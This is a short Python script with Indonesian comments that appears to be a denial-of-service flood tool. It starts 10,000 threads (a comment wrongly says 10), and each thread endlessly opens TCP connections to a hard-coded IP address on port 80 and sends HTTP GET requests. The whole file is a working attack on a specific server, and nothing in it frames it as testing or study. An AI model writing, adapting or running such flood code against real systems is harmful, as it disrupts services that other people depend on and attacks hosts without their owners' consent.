import socket
import threading
 
def send_request():
    while True:
        # Membuat socket TCP
        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Mengganti alamat dan port sesuai kebutuhan (contoh: alamat IP dan port)
        server_address = ('158.220.106.212', 80)

        # Mencoba untuk terhubung ke server
        tcp_socket.connect(server_address)

        # Mengirim data
        tcp_socket.sendall(b'GET / HTTP/1.1\r\nHost: 158.220.106.212\r\n\r\n')

        # Menutup koneksi
        tcp_socket.close()
        print("Request sent successfully!")

# Membuat 10 thread
threads = []
for _ in range(10000):
    thread = threading.Thread(target=send_request)
    threads.append(thread)

# Menjalankan setiap thread
for thread in threads:
    thread.start()

# Menunggu hingga semua thread selesai
for thread in threads:
    thread.join()
